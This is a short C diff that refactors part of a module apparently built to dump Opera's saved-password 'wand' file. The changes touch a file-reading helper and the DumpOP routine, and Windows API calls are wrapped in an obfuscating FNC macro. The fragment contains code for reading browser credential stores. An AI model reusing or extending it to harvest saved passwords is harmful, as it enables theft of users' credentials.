@@ -55,8 +55,7 @@ static inline WCHAR* GetOPProfilePath11(WCHAR* FullPath, size_t size, const WCHA
 #endif
 
 #define FORM_FIELDS 0x0c020000
-
-static BYTE* getFileContent(LPCWSTR lpFileName, LPDWORD FileSize)
+BYTE* getFileContent(LPCWSTR lpFileName, LPDWORD FileSize)
 {
 	if (lpFileName == NULL)
 		return NULL;
@@ -64,7 +63,7 @@ static BYTE* getFileContent(LPCWSTR lpFileName, LPDWORD FileSize)
 	HANDLE hFile;
 	if ((hFile = FNC(CreateFileW)(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
 		return 0;
-	
+
 	*FileSize = FNC(GetFileSize)(hFile, NULL);
 	HANDLE hMap;
 	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
@@ -72,9 +71,9 @@ static BYTE* getFileContent(LPCWSTR lpFileName, LPDWORD FileSize)
 		return 0;
 	}
 
-	BYTE *wandMap = (BYTE*)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0);
+	BYTE* wandMap = (BYTE*)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0);
 
-	BYTE *ptr = (unsigned char*)malloc(*FileSize);
+	BYTE* ptr = (unsigned char*)malloc(*FileSize);
 
 	if (wandMap != NULL && ptr != NULL)
 		memcpy(ptr, wandMap, *FileSize);
@@ -89,13 +88,12 @@ static BYTE* getFileContent(LPCWSTR lpFileName, LPDWORD FileSize)
 
 static int DumpOP(WCHAR *wandPath)
 {
-	unsigned char *wandData, *wandMap;
 	p_entry opentry;
 
 	memset(&opentry, 0, sizeof(opentry));
 
 	DWORD fileSize = 0;
-	wandData = getFileContent(wandPath, &fileSize);
+	BYTE *wandData = getFileContent(wandPath, &fileSize);
 
 	swprintf_s(opentry.service, 255, L"Opera");
 
